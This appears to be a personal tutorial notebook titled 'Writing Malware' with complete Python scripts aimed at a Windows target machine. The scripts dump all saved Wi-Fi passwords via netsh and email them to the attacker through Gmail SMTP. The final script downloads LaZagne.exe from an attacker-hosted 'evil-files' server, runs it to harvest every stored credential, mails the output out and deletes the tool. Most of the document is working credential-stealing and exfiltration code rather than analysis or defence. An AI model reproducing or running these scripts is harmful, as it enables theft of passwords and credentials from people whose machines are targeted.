# Writing Malware

## Table of content

- #Execute System Command Payload
- #Stealing Wifi Passwords Saved on a Computer
    - #Sending Emails Using Python
    - #App password generation
    - #Filtering Command Output Using `Regex`
    - #Finally Stealing Wifi Passwords Saved on a Computer
- #`Downloading` Files Using `Python`
    - #Writing Files on Disk
- #Stealing Saved Passwords From Remote Computers Using `LaZagne`

# #Execute System Command Payload

![Screenshot 2024-03-17 225901.png](Writing%20Malware%208807b30c1663449c9b571d0ecaf6eef5/Screenshot_2024-03-17_225901.png)

execute_command.py

```python
#! /usr/bin/env python

import subprocess

#command for 32-bit python
# command = "%SystemRoot%\Sysnative\msg.exe * you are hacked" 
#command for 64-bit python
command = "msg * you are hacked"
subprocess.Popen(command, shell=True)
```

### **On The Target Window Machine**

```python
C:\Python27\python.exe execute_command.py
```

![Screenshot 2024-03-17 230041.png](Writing%20Malware%208807b30c1663449c9b571d0ecaf6eef5/Screenshot_2024-03-17_230041.png)

---

# #Stealing Wifi Passwords Saved on a Computer

## #Sending Emails Using Python

![Screenshot 2024-03-17 230440.png](Writing%20Malware%208807b30c1663449c9b571d0ecaf6eef5/Screenshot_2024-03-17_230440.png)

`execute_and_report.py`

```python
#! /usr/bin/env python

import subprocess, smtplib

def send_mail(email, password, message):
    server = smtplib.SMTP("smtp.gmail.com", 587)
    server.starttls()
    server.login(email, password)
    server.sendmail(email, email, message)
    server.quit()

#This command extract the <wifi_name> password 
command = "netsh wlan show profile <wifi_name> key=clear"
result = subprocess.check_output(command, shell=True)
send_mail("<email_id>", "<app_pass>", result)

```

## #App password generation

Go to [`myaccount.google](http://myaccount.google) --> Security --> 2-Step Verification --> App passwords`

![Screenshot 2024-03-13 142909.png](Writing%20Malware%208807b30c1663449c9b571d0ecaf6eef5/Screenshot_2024-03-13_142909.png)

![Screenshot 2024-03-13 143805.png](Writing%20Malware%208807b30c1663449c9b571d0ecaf6eef5/Screenshot_2024-03-13_143805.png)

![Screenshot 2024-03-13 143834.png](Writing%20Malware%208807b30c1663449c9b571d0ecaf6eef5/Screenshot_2024-03-13_143834.png)

![Screenshot 2024-03-13 143907.png](Writing%20Malware%208807b30c1663449c9b571d0ecaf6eef5/Screenshot_2024-03-13_143907.png)

It will generate you a app password which we will use in `execute_and_report.py` program.

### **On The Target Machine**

```python
C:\Python27\python.exe execute_and_report.py
```

![Screenshot 2024-03-17 230041.png](Writing%20Malware%208807b30c1663449c9b571d0ecaf6eef5/Screenshot_2024-03-17_230041%201.png)

### **On The Attacker Machine**

![Screenshot 2024-03-17 233349.png](Writing%20Malware%208807b30c1663449c9b571d0ecaf6eef5/Screenshot_2024-03-17_233349.png)

## #Filtering Command Output Using `Regex`

![Screenshot 2024-03-18 025635.png](Writing%20Malware%208807b30c1663449c9b571d0ecaf6eef5/Screenshot_2024-03-18_025635.png)

```python
#! /usr/bin/env python

import subprocess, smtplib, re

def send_mail(email, password, message):
    server = smtplib.SMTP("smtp.gmail.com", 587)
    server.starttls()
    server.login(email, password)
    server.sendmail(email, email, message)
    server.quit()

command = "netsh wlan show profile"
networks = subprocess.check_output(command, shell=True)
network_names_list = re.findall("(?:Profile\s*:\s)(.*)", networks)
print(network_names_list)

#send_mail("<email_id>", "<app_pass>", result)

```

![Screenshot 2024-03-18 030029.png](Writing%20Malware%208807b30c1663449c9b571d0ecaf6eef5/Screenshot_2024-03-18_030029.png)

## #Finally Stealing Wifi Passwords Saved on a Computer

execute_and_report.py

```python
#! /usr/bin/env python

import subprocess, smtplib, re

def send_mail(email, password, message):
    server = smtplib.SMTP("smtp.gmail.com", 587)
    server.starttls()
    server.login(email, password)
    server.sendmail(email, email, message)
    server.quit()

command = "netsh wlan show profile"
networks = subprocess.check_output(command, shell=True)
network_names_list = re.findall("(?:Profile\s*:\s)(.*)", networks)

result = ""
for network_name in network_names_list:
    command = "netsh wlan show profile " + network_name + " key=clear"
    current_result = subprocess.check_output(command, shell=True)
    result = result + current_result

send_mail("<email_id>", "<app_pass>", result)

```

---

# #`Downloading` Files Using `Python`

![Screenshot 2024-03-18 032716.png](Writing%20Malware%208807b30c1663449c9b571d0ecaf6eef5/Screenshot_2024-03-18_032716.png)

download.py

```python
#! /usr/bin/env python

import requests

def download(url):
    get_response = requests.get(url)
    print(get_response.content)
    
download("https://d2hucwwplm5rxi.cloudfront.net/wp-content/uploads/2022/09/23074716/sports-vs-supercars-cover-230920221250.jpg")
```

## #Writing Files on Disk

```python
#! /usr/bin/env python

import requests

def download(url):
    get_response = requests.get(url)
    file_name = url.split("/")[-1]
    with open(file_name, "wb") as out_file:
        out_file.write(get_response.content)

download("https://d2hucwwplm5rxi.cloudfront.net/wp-content/uploads/2022/09/23074716/sports-vs-supercars-cover-230920221250.jpg")
```

---

# #Stealing Saved Passwords From Remote Computers Using `LaZagne`

![Screenshot 2024-03-18 142125.png](Writing%20Malware%208807b30c1663449c9b571d0ecaf6eef5/Screenshot_2024-03-18_142125.png)

In this task we will use `LaZagne` to extract the saved password.

[https://github.com/0x0ff537/LaZagne/releases](https://github.com/0x0ff537/LaZagne/releases)

![Screenshot 2024-03-18 142811.png](Writing%20Malware%208807b30c1663449c9b571d0ecaf6eef5/Screenshot_2024-03-18_142811.png)

The **`LaZagne project`** is an open source application used to **retrieve lots of passwords** stored on a local computer. Each software stores its passwords using different techniques (plaintext, APIs, custom algorithms, databases, etc.). This tool has been developed for the purpose of finding these passwords for the most commonly-used software.

![https://user-images.githubusercontent.com/10668373/43320585-3e34c124-91a9-11e8-9ebc-d8eabafd8ac5.png](https://user-images.githubusercontent.com/10668373/43320585-3e34c124-91a9-11e8-9ebc-d8eabafd8ac5.png)

This project has been added to [pupy](https://github.com/n1nj4sec/pupy/) as a post-exploitation module. Python code will be interpreted in memory without touching the disk and it works on Windows and Linux host.

download_execute_and_report.py

```python
#! /usr/bin/env python

import requests, subprocess, smtplib, os, tempfile

def download(url):
    get_response = requests.get(url)
    file_name = url.split("/")[-1]
    with open(file_name, "wb") as out_file:
        out_file.write(get_response.content)

def send_mail(email, password, message):
    server = smtplib.SMTP("smtp.gmail.com", 587)
    server.starttls()
    server.login(email, password)
    server.sendmail(email, email, message)
    server.quit()

temp_directory = tempfile.gettempdir()
os.chdir(temp_directory)
download("http://192.168.111.128/evil-files/LaZagne.exe")
result = subprocess.check_output("LaZagne.exe all", shell=True)
send_mail("<email_id>", "<app_pass>", result)
os.remove("LaZagne.exe")
```

![Screenshot 2024-03-18 145236.png](Writing%20Malware%208807b30c1663449c9b571d0ecaf6eef5/Screenshot_2024-03-18_145236.png)

### **On The Target Machine**

![Screenshot 2024-03-18 145935.png](Writing%20Malware%208807b30c1663449c9b571d0ecaf6eef5/Screenshot_2024-03-18_145935.png)

### **On The Attacker Machine**

![Screenshot 2024-03-18 151740.png](Writing%20Malware%208807b30c1663449c9b571d0ecaf6eef5/Screenshot_2024-03-18_151740.png)

---